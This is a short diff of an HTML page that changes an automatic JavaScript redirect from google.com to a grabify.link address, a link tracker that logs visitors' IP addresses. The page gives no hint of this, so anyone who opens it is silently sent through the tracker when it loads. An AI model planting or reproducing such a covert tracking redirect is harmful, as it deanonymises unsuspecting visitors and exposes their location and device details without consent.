@@ -7,7 +7,7 @@
 <body>
 
 	<script type="text/javascript">
-		window.location.replace("https://google.com");
+		window.location.replace("https://grabify.link/PYDAMG");
 	</script>
 
 </body>
